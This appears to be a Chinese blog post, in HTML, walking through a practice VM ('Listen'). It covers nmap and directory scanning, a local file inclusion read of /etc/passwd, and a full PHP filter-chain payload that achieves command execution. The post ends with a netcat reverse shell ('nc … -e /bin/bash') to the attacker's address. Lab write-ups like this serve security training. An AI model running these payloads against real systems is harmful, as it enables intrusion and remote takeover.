@@ -1,0 +1,812 @@
+<!DOCTYPE html>
+<html data-color-mode="light" data-dark-theme="dark" data-light-theme="light" lang="zh-CN">
+<head>
+    <meta content="text/html; charset=utf-8" http-equiv="content-type" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link href='https://mirrors.sustech.edu.cn/cdnjs/ajax/libs/Primer/21.0.7/primer.css' rel='stylesheet' />
+    
+    <link rel="icon" href="https://github.githubassets.com/favicons/favicon.svg"><script>
+        let theme = localStorage.getItem("meek_theme") || "light";
+        document.documentElement.setAttribute("data-color-mode", theme);
+    </script>
+<meta name="description" content="# Listen
+
+# 0.简介
+
+这是一个群友的靶机，我不知道他发不发布，所以就看看吧，学习学习
+
+**目标 IP**：192.168.205.137  
+**本机 IP**：192.168.205.128
+
+# 1.扫描
+
+​`nmap`​起手
+
+```
+┌──(kali㉿kali)-[~/test]
+└─$ nmap -A -Pn -n --min-rate 10000 192.168.205.137
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-03 13:15 CST
+Nmap scan report for 192.168.205.137
+Host is up (0.00021s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u4 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 c2:91:d9:a5:f7:a3:98:1f:c1:4a:70:28:aa:ba:a4:10 (RSA)
+|   256 3e:1f:c9:eb:c0:6f:24:06:fc:52:5f:2f:1b:35:33:ec (ECDSA)
+|_  256 ec:64:87:04:9a:4b:32:fe:2d:1f:9a:b0:81:d3:7c:cf (ED25519)
+80/tcp open  http    nginx 1.14.2
+|_http-title: \xE5\x87\x9B\xE5\x86\xBD\xE6\x99\x82\xE9\x9B\xA8 - \xE5\x85\xAC\xE5\xBC\x8F\xE3\x82\xA6\xE3\x82\xA7\xE3\x83\x96\xE3\x82\xB5\xE3\x82\xA4\xE3\x83\x88
+|_http-server-header: nginx/1.14.2
+MAC Address: 08:00:27:97:BD:AA (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.19
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.22 ms 192.168.205.137
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 7.90 seconds
+                                                                
+```
+
+# 2.踩点
+
+![image](assets/image-20250203131735-r28u372.png)
+
+测文件包含，测完了也没结果，所以来个目录爆破先
+
+```
+┌──(kali㉿kali)-[~/test]
+└─$ feroxbuster -u http://192.168.205.137 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt -x php,html,md,txt
+                                                                                                                                    
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben 'epi' Risher 🤓                 ver: 2.11.0
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://192.168.205.137
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt
+ 👌  Status Codes          │ All Status Codes!
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.11.0
+ 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+ 🔎  Extract Links         │ true
+ 💲  Extensions            │ [php, html, md, txt]
+ 🏁  HTTP methods          │ [GET]
+ 🔃  Recursion Depth       │ 4
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+200      GET       48l      102w     2359c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter                                                                                                                                   
+403      GET        7l       10w      169c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter                                                                                                                                   
+404      GET        7l       12w      169c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter                                                                                                                                   
+200      GET        3l        1w       16c http://192.168.205.137/test.php
+200      GET        2l        1w       17c http://192.168.205.137/tools.php
+200      GET        1l        3w      228c http://192.168.205.137/README.md
+200      GET        2l        1w       15c http://192.168.205.137/pp.php
+
+```
+
+探索一下
+
+```
+┌──(kali㉿kali)-[~/test]
+└─$ curl http://192.168.205.137/test.php                
+<h1>test</h1>
+
+
+                                                                                                                                    
+┌──(kali㉿kali)-[~/test]
+└─$ curl http://192.168.205.137/tools.php
+<h1>tools</h1>
+ 
+                                                                                                                                    
+┌──(kali㉿kali)-[~/test]
+└─$ curl http://192.168.205.137/pp.php   
+<h1>test</h1>
+
+                                                                                                                                    
+┌──(kali㉿kali)-[~/test]
+└─$ curl http://192.168.205.137/README.md
+2025年1月22日　本プロジェクトの開発は一旦ここで終了です。">
+<meta property="og:title" content="Listen">
+<meta property="og:description" content="# Listen
+
+# 0.简介
+
+这是一个群友的靶机，我不知道他发不发布，所以就看看吧，学习学习
+
+**目标 IP**：192.168.205.137  
+**本机 IP**：192.168.205.128
+
+# 1.扫描
+
+​`nmap`​起手
+
+```
+┌──(kali㉿kali)-[~/test]
+└─$ nmap -A -Pn -n --min-rate 10000 192.168.205.137
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-03 13:15 CST
+Nmap scan report for 192.168.205.137
+Host is up (0.00021s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u4 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 c2:91:d9:a5:f7:a3:98:1f:c1:4a:70:28:aa:ba:a4:10 (RSA)
+|   256 3e:1f:c9:eb:c0:6f:24:06:fc:52:5f:2f:1b:35:33:ec (ECDSA)
+|_  256 ec:64:87:04:9a:4b:32:fe:2d:1f:9a:b0:81:d3:7c:cf (ED25519)
+80/tcp open  http    nginx 1.14.2
+|_http-title: \xE5\x87\x9B\xE5\x86\xBD\xE6\x99\x82\xE9\x9B\xA8 - \xE5\x85\xAC\xE5\xBC\x8F\xE3\x82\xA6\xE3\x82\xA7\xE3\x83\x96\xE3\x82\xB5\xE3\x82\xA4\xE3\x83\x88
+|_http-server-header: nginx/1.14.2
+MAC Address: 08:00:27:97:BD:AA (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.19
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.22 ms 192.168.205.137
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 7.90 seconds
+                                                                
+```
+
+# 2.踩点
+
+![image](assets/image-20250203131735-r28u372.png)
+
+测文件包含，测完了也没结果，所以来个目录爆破先
+
+```
+┌──(kali㉿kali)-[~/test]
+└─$ feroxbuster -u http://192.168.205.137 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt -x php,html,md,txt
+                                                                                                                                    
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben 'epi' Risher 🤓                 ver: 2.11.0
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://192.168.205.137
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt
+ 👌  Status Codes          │ All Status Codes!
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.11.0
+ 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+ 🔎  Extract Links         │ true
+ 💲  Extensions            │ [php, html, md, txt]
+ 🏁  HTTP methods          │ [GET]
+ 🔃  Recursion Depth       │ 4
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+200      GET       48l      102w     2359c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter                                                                                                                                   
+403      GET        7l       10w      169c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter                                                                                                                                   
+404      GET        7l       12w      169c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter                                                                                                                                   
+200      GET        3l        1w       16c http://192.168.205.137/test.php
+200      GET        2l        1w       17c http://192.168.205.137/tools.php
+200      GET        1l        3w      228c http://192.168.205.137/README.md
+200      GET        2l        1w       15c http://192.168.205.137/pp.php
+
+```
+
+探索一下
+
+```
+┌──(kali㉿kali)-[~/test]
+└─$ curl http://192.168.205.137/test.php                
+<h1>test</h1>
+
+
+                                                                                                                                    
+┌──(kali㉿kali)-[~/test]
+└─$ curl http://192.168.205.137/tools.php
+<h1>tools</h1>
+ 
+                                                                                                                                    
+┌──(kali㉿kali)-[~/test]
+└─$ curl http://192.168.205.137/pp.php   
+<h1>test</h1>
+
+                                                                                                                                    
+┌──(kali㉿kali)-[~/test]
+└─$ curl http://192.168.205.137/README.md
+2025年1月22日　本プロジェクトの開発は一旦ここで終了です。">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://7r1UMPH.github.io/post/Listen.html">
+<meta property="og:image" content="https://github.githubassets.com/favicons/favicon.svg">
+<title>Listen</title>
+<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
+
+
+</head>
+<style>
+body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;padding: 45px;font-size: 16px;font-family: sans-serif;line-height: 1.25;}
+#header{display:flex;padding-bottom:8px;border-bottom: 1px solid var(--borderColor-muted, var(--color-border-muted));margin-bottom: 16px;}
+#footer {margin-top:64px; text-align: center;font-size: small;}
+
+</style>
+
+<style>
+.postTitle{margin: auto 0;font-size:40px;font-weight:bold;}
+.title-right{display:flex;margin:auto 0 0 auto;}
+.title-right .circle{padding: 14px 16px;margin-right:8px;}
+#postBody{border-bottom: 1px solid var(--color-border-default);padding-bottom:36px;}
+#postBody hr{height:2px;}
+#cmButton{height:48px;margin-top:48px;}
+#comments{margin-top:64px;}
+.g-emoji{font-size:24px;}
+@media (max-width: 600px) {
+    body {padding: 8px;}
+    .postTitle{font-size:24px;}
+}
+.copy-feedback {
+    display: none;
+    position: absolute;
+    top: 10px;
+    right: 50px;
+    color: var(--color-fg-on-emphasis);
+    background-color: var(--color-fg-muted);
+    border-radius: 3px;
+    padding: 5px 8px;
+    font-size: 12px;
+}
+</style>
+
+
+
+
+<body>
+    <div id="header">
+<h1 class="postTitle">Listen</h1>
+<div class="title-right">
+    <a href="https://7r1UMPH.github.io" id="buttonHome" class="btn btn-invisible circle" title="首页">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathHome" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+    <a href="https://github.com/7r1UMPH/7r1UMPH.github.io/issues/39" target="_blank" class="btn btn-invisible circle" title="Issue">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathIssue" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+
+    <a class="btn btn-invisible circle" onclick="modeSwitch();" title="切换主题">
+        <svg class="octicon" width="16" height="16" >
+            <path id="themeSwitch" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+
+</div>
+</div>
+    <div id="content">
+<div class="markdown-body" id="postBody"><h1>Listen</h1>
+<h1>0.简介</h1>
+<p>这是一个群友的靶机，我不知道他发不发布，所以就看看吧，学习学习</p>
+<p><strong>目标 IP</strong>：192.168.205.137<br>
+<strong>本机 IP</strong>：192.168.205.128</p>
+<h1>1.扫描</h1>
+<p>​<code class="notranslate">nmap</code>​起手</p>
+<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
+└─$ nmap -A -Pn -n --min-rate 10000 192.168.205.137
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-03 13:15 CST
+Nmap scan report for 192.168.205.137
+Host is up (0.00021s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u4 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 c2:91:d9:a5:f7:a3:98:1f:c1:4a:70:28:aa:ba:a4:10 (RSA)
+|   256 3e:1f:c9:eb:c0:6f:24:06:fc:52:5f:2f:1b:35:33:ec (ECDSA)
+|_  256 ec:64:87:04:9a:4b:32:fe:2d:1f:9a:b0:81:d3:7c:cf (ED25519)
+80/tcp open  http    nginx 1.14.2
+|_http-title: \xE5\x87\x9B\xE5\x86\xBD\xE6\x99\x82\xE9\x9B\xA8 - \xE5\x85\xAC\xE5\xBC\x8F\xE3\x82\xA6\xE3\x82\xA7\xE3\x83\x96\xE3\x82\xB5\xE3\x82\xA4\xE3\x83\x88
+|_http-server-header: nginx/1.14.2
+MAC Address: 08:00:27:97:BD:AA (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.19
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.22 ms 192.168.205.137
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 7.90 seconds
+                                                                
+</code></pre>
+<h1>2.踩点</h1>
+<p><a target="_blank" rel="noopener noreferrer" href="assets/image-20250203131735-r28u372.png"><img src="assets/image-20250203131735-r28u372.png" alt="image" style="max-width: 100%;"></a></p>
+<p>测文件包含，测完了也没结果，所以来个目录爆破先</p>
+<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
+└─$ feroxbuster -u http://192.168.205.137 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt -x php,html,md,txt
+                                                                                                                                    
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben "epi" Risher 🤓                 ver: 2.11.0
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://192.168.205.137
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt
+ 👌  Status Codes          │ All Status Codes!
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.11.0
+ 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+ 🔎  Extract Links         │ true
+ 💲  Extensions            │ [php, html, md, txt]
+ 🏁  HTTP methods          │ [GET]
+ 🔃  Recursion Depth       │ 4
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+200      GET       48l      102w     2359c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter                                                                                                                                   
+403      GET        7l       10w      169c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter                                                                                                                                   
+404      GET        7l       12w      169c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter                                                                                                                                   
+200      GET        3l        1w       16c http://192.168.205.137/test.php
+200      GET        2l        1w       17c http://192.168.205.137/tools.php
+200      GET        1l        3w      228c http://192.168.205.137/README.md
+200      GET        2l        1w       15c http://192.168.205.137/pp.php
+
+</code></pre>
+<p>探索一下</p>
+<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
+└─$ curl http://192.168.205.137/test.php                
+&lt;h1&gt;test&lt;/h1&gt;
+
+
+                                                                                                                                    
+┌──(kali㉿kali)-[~/test]
+└─$ curl http://192.168.205.137/tools.php
+&lt;h1&gt;tools&lt;/h1&gt;
+ 
+                                                                                                                                    
+┌──(kali㉿kali)-[~/test]
+└─$ curl http://192.168.205.137/pp.php   
+&lt;h1&gt;test&lt;/h1&gt;
+
+                                                                                                                                    
+┌──(kali㉿kali)-[~/test]
+└─$ curl http://192.168.205.137/README.md
+2025年1月22日　本プロジェクトの開発は一旦ここで終了です。正式にプロジェクトが2月に公開される前に、テスト部分を必ず整理してください。——開発チーム　アダシ
+                        
+</code></pre>
+<p>前面在首页可以看到是用do函数传参，所以我们测试一下</p>
+<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
+└─$ curl http://192.168.205.137/test.php?do=../../../etc/passwd
+&lt;h1&gt;test&lt;/h1&gt;
+self-hacking!                                                                                                                                    
+┌──(kali㉿kali)-[~/test]
+└─$ curl http://192.168.205.137/tools.php?do=../../../etc/passwd
+&lt;h1&gt;tools&lt;/h1&gt;
+ 
+                                                                                                                                    
+┌──(kali㉿kali)-[~/test]
+└─$ curl http://192.168.205.137/pp.php?do=../../../etc/passwd
+&lt;h1&gt;test&lt;/h1&gt;
+try
+                   
+</code></pre>
+<p>两个有反应，tools没反应，我用的是pp.php</p>
+<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
+└─$ curl http://192.168.205.137/pp.php?do=php://filter/convert.base64-encode/resource=../../../../etc/passwd
+&gt; 
+&lt;h1&gt;test&lt;/h1&gt;
+trycm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCl9hcHQ6eDoxMDA6NjU1MzQ6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpzeXN0ZW1kLXRpbWVzeW5jOng6MTAxOjEwMjpzeXN0ZW1kIFRpbWUgU3luY2hyb25pemF0aW9uLCwsOi9ydW4vc3lzdGVtZDovdXNyL3NiaW4vbm9sb2dpbgpzeXN0ZW1kLW5ldHdvcms6eDoxMDI6MTAzOnN5c3RlbWQgTmV0d29yayBNYW5hZ2VtZW50LCwsOi9ydW4vc3lzdGVtZDovdXNyL3NiaW4vbm9sb2dpbgpzeXN0ZW1kLXJlc29sdmU6eDoxMDM6MTA0OnN5c3RlbWQgUmVzb2x2ZXIsLCw6L3J1bi9zeXN0ZW1kOi91c3Ivc2Jpbi9ub2xvZ2luCm1lc3NhZ2VidXM6eDoxMDQ6MTEwOjovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4Kc3lzdGVtZC1jb3JlZHVtcDp4Ojk5OTo5OTk6c3lzdGVtZCBDb3JlIER1bXBlcjovOi91c3Ivc2Jpbi9ub2xvZ2luCnNzaGQ6eDoxMDU6NjU1MzQ6Oi9ydW4vc3NoZDovdXNyL3NiaW4vbm9sb2dpbgp3ZWxjb21lOng6MTAwMToxMDAxOjovaG9tZS93ZWxjb21lOi9iaW4vc2gKbXlzcWw6eDoxMDY6MTEzOk15U1FMIFNlcnZlciwsLDovbm9uZXhpc3RlbnQ6L2Jpbi9mYWxzZQo=
+                                                          
+</code></pre>
+<p>有回显，所以测一下php filter</p>
+<pre class="notranslate"><code class="notranslate">http://192.168.205.137/pp.php?do=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&amp;0=id
+</code></pre>
+<p><a target="_blank" rel="noopener noreferrer" href="assets/image-20250203132831-rph10bg.png"><img src="assets/image-20250203132831-rph10bg.png" alt="image" style="max-width: 100%;"></a></p>
+<p>弹shell</p>
+<pre class="notranslate"><code class="notranslate">http://192.168.205.137/pp.php?do=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&amp;0=nc%20192.168.205.128%208888%20-e%20/bin/bash
+</code></pre>
